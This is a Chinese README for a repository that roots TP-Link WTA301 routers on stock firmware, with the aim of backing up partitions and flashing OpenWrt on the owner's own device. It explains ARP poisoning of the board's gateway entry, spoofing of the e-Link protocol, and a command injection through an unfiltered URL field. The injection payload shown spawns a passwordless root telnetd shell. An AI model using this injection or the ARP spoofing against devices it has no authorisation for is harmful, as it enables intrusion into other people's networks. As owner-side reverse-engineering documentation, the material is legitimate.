# getroot —— 免拆机 / 免 TTL 拿原厂 root

> 适用：TP-Link **WTA301**（IPQ5018 + QCN6122）**原厂固件** 2.0.x。
> 目的：在**不接串口、不拆机**的前提下拿到 `uid=0`，从而能备份原厂分区、
> 写入 u-boot、进而刷 OpenWrt。

---

## ⚠️ 先读这一段

**只在你自己拥有的设备上用。**

这里的脚本利用的是原厂固件里 `ctcapd`/`appd` 的 URL 未过滤缺陷（详见 §3）。
这个缺陷存在于**已出厂、在网运行的设备**上，属于厂商与运营商的安全问题。
本仓库发布它的原因是**可复现性与研究记录**（见 `THIRD-PARTY.md` 与
`docs/GETROOT-AND-NORMAL-USER-FLASH.md` 的定位），不是鼓励在他人网络上使用。

- 对**别人的**设备执行 = 未授权访问计算机系统，多数司法辖区属刑事犯罪。
- 两个脚本都会**临时改动本机网络配置**（别名 / ARP 记录），退出时自动还原，
  但**运行期间本机可能断网**。README 与脚本文档里逐条写明了。
- 拿到的 root shell **无密码**（`telnetd -l /bin/sh`），局域网内任何人都能连。
  用完请**立即重启板子**（重启即消失，因为 `telnetd` 只活在 RAM 里）。

---

## 1. 用哪个脚本

| 文件 | 状态 | 什么时候用 |
|---|---|---|
| **`rawtcp_gw.py`** | ✅ **唯一推荐** · 自包含 · 本板实证 3 次成功 | 默认就用这个 |
| `getroot_alias.py` | ⚠️ 可用但会断本机网 | `rawtcp_gw.py` 收不到 SYN 时的备选（拓扑不同） |
| `legacy/*` | ❌ 已被取代 | 只为了对上既有文档的引用，别直接跑 |
| `negative/*` | ❌ **已实测否定** | 反面证据，记录「为什么那条路走不通」 |

---

## 2. `rawtcp_gw.py` —— 推荐方案

### 2.1 依赖

```bash
pip install scapy
```

**Windows 还需要 Npcap**（scapy 要发原始以太网帧）：

- 安装 Npcap 时必须勾选 **"Install Npcap in WinPcap API-compatible Mode"**
- 装完确认这两个 DLL 存在，否则 `sendp()` 会直接抛
  `No libpcap provider available`：

  ```
  C:\Windows\System32\Npcap\wpcap.dll
  C:\Windows\System32\Npcap\Packet.dll
  ```

- 需要**管理员权限**（读写网卡 + 改防火墙规则）

Linux 下只要 `libpcap-dev`，`sudo` 运行即可。

### 2.2 用法

```bash
# 1) 找到板子 IP（通常它就是网关，或在其 DHCP 段内）
#    板子 MAC 以 98:97:CC 开头；用 arp -a / ip neigh 确认

# 2) 跑（--wait 是等待秒数，必须 > elinkclt 的 240 秒上报周期）
python rawtcp_gw.py --ip 192.168.1.175 --wait 400

# 3) 看到这行就成功了：
#    === 成功！root shell: telnet 192.168.1.175 2323 ===

# 4) 连上去
telnet 192.168.1.175 2323
id        # uid=0(root) gid=0(root)
```

**本板实测耗时**：12 秒（2026-11-08）、18 秒（2026-11-07）。
脚本退出时会用 `poison.restore()` 把板子的网关 MAC 还原成真值，
并用内置 `NetWatch`（每 2 秒 ping 真网关 + 公网）确认本机没断网。

### 2.3 为什么它不需要给本机加 IP 别名

这是本脚本最关键的、也是最容易被后人改坏的设计。三条：

1. **ARP 只毒化板子自身邻居表里「网关」那一条**（单播 ARP 应答，不广播）。
   板子做桥接时，本机→上游的流量走 FDB 表，不经板子 IP 栈 ⇒ 不受影响。
2. **Windows 对「目的 IP 不属于本机」的包会静默丢弃、不回 RST**（这是好事）。
   所以 scapy 在 L2 上自己实现了一个最小 TCP 端点，直接收下目的 IP 为网关的 SYN。
3. **不给本机加任何地址**。加 `<网关IP>/32` 会让这个 IP 变成「本机地址」，
   单网卡拓扑下等于抢掉自己的默认路由 → **立刻断网**。
   `skipassource=true` 只影响源地址选择，不改变这个事实，**不防断网**。

> `getroot_alias.py`（和 `legacy/getroot.py`）走的是「加别名」那条老路，
> 在**单网卡**拓扑下会断网。多网卡拓扑（另有一块网卡上网）才安全。

### 2.4 已知失败模式

| 现象 | 原因 | 处理 |
|---|---|---|
| `SYN=0` 一直到超时 | 板子的 `elinkclt` 还没到上报周期 | `--wait` 必须 > 240 秒，别用 120 |
| `ValueError: length ... not a multiple of the block length` | 复用了上一条连接的 `Elink()` | 每条新 TCP 连接必须**重建** `Elink()`；脚本已处理，改代码时别合并 |
| `No libpcap provider available` | 缺 Npcap / `wpcap.dll` | 见 §2.1 |
| 板子根本不来连 | 路由模式下 WAN 侧没有网关，`elinkclt` 没有回连对象 | 见 §3.4 |

---

## 3. 原理链（每一环都有板上原文出处）

完整推导与证据原文见 **`docs/GETROOT-AND-NORMAL-USER-FLASH.md`**。
这里只给结论骨架：

```
① 板子上的 elinkclt（电信号 e-Link 客户端）周期性去连 <默认网关>:32768
② 我们让这条 TCP 落到本机（ARP 单点改板子邻居表 + L2 自实现 TCP 端点）
③ 协议握手：keyngreq → keyngack → dh（DH128）→ AES-128-CBC(IV=0)
            帧格式 [BE u32 magic 0x3f721fb5][len][payload]
④ 板子发 dev_reg，带上 {"model":"WTA301","swversion":...}
⑤ 我们下发 ubus_call ctcapd.appd install，url 字段未过滤 `;`
⑥ 注入：http://<本机>:8099/x;(/bin/busybox telnetd -l /bin/sh -p 2323 ...);
⑦ 板子收到 ubus_result: {"result":-1,"failreason":"download failed: file not found"}
   ↑ 这条「失败」正是注入成功的标志：wget 失败，但 `;` 后面的 telnetd 已 fork
```

### 3.1 成功判据

不是看脚本说 OK，而是三条都成立：

```bash
# 板子上
id                        # uid=0(root) gid=0(root)
netstat -an | grep 2323   # LISTEN
ps | grep telnetd         # /bin/busybox telnetd -l /bin/sh -p 2323
```

### 3.2 e-Link 帧格式

```
[ BE u32 magic = 0x3f721fb5 ][ BE u32 len ][ payload ]
```

AES-128-CBC，IV 全 0，密钥由 DH128 协商得出。

### 3.3 为什么必须「每条新连接重建状态机」

`elinkclt` 断线重连后首帧是**明文** `keyngreq`。沿用上一条连接的 AES 密钥去解
会抛 `ValueError: length ... not a multiple of the block length`。
脚本里 `Elink()` 是每条连接新建的 —— 这是**故意**的，不要「优化」成复用。

### 3.4 什么时候这条路**不可能**成功

**路由模式 + WAN 口没网**时不行，这不是脚本的问题：

`elinkclt` 用 SSDP 发现网关（`lssdp_send_msearch` → 解析 `LOCATION:` → 连
`<网关IP>:32768`），字符串表里还有硬编码兜底（`192.168.1.1` / `32768`）。
**板子自己就是 LAN 网关、WAN 侧又没有上游网关时，它没有回连对象**，
于是永远不发 SYN。此时只能接串口（`docs/` 里的 TTL 方案）。

已实测否定的两条路，证据保留在 `negative/`：

| 路 | 做法 | 结果 |
|---|---|---|
| SSDP 应答 | 从 32768 源端口回 `M-SEARCH` 应答，10 种 `LOCATION` 格式，源 IP 伪造成网关 | **零连接**（板子只认硬编码兜底） |
| 只毒化不加别名 | 让 TCP 到达本机网卡 | 目的 IP 非本机 ⇒ 内核静默丢弃 |

---

## 4. 拿到 root 之后

**第一件事是备份**，别急着刷任何东西：

```bash
# 板上执行；写到 /tmp（tmpfs，重启即失，但原厂 overlay 本来就在 /tmp）
dd if=/dev/mtd5  of=/tmp/mtd5_kernel.bin
dd if=/dev/mtd6  of=/tmp/mtd6_rootfs.bin
dd if=/dev/mtd10 of=/tmp/mtd10_kernel_bak.bin
dd if=/dev/mtd11 of=/tmp/mtd11_rootfs_bak.bin
md5sum /tmp/mtd*.bin
```

然后拉回本机比对 md5（期望值见 `docs/V30-FLASH-VERIFIED.md` 与
`work/backup/` 的清单；文件名与物理位置在原厂下**是反的**，只认 md5）。

⚠️ **原厂板上没有 `mtd` / `nandwrite` / `flash_erase`**，只有 `dd`、`md5sum`、
`hexdump`、`strings` 和厂商自家的 `sysupgrade`。
**读**（`dd if=`）是安全的；**写**千万不要用 `dd of=/dev/mtdN` —— 会绕过 ECC，
分区直接报废（见 `docs/` 里的实证记录）。

---

## 5. 这份代码的来历

- `rawtcp_gw.py`：本项目原创，基于本板逆向与 3 次实测（2026-11-07/08）
- `getroot_alias.py`：早期版本（原名 `getroot3.py`），别名 + 毒化路线
- `legacy/`：更早的四件套，`docs/GETROOT-AND-NORMAL-USER-FLASH.md` §1.1
  按文件名引用了它们；搬进仓库是为了让那条引用不再是断链
- `negative/`：**故意保留的失败记录**。删掉它们等于让后来的人再撞一次同样的墙

为了让误入者不会直接跑错脚本，`negative/`、`legacy/`、`getroot_alias.py`
每个文件顶部加了一段状态 banner（文件正文本身未改，只做了 CRLF→LF）。

许可：与本仓库一致，GPL-2.0（见根目录 `LICENSE`）。
第三方依赖：`scapy`（GPL-2.0）、`cryptography`（Apache-2.0/BSD，仅 `legacy/` 用）、
Npcap（自由/商业双许可）。
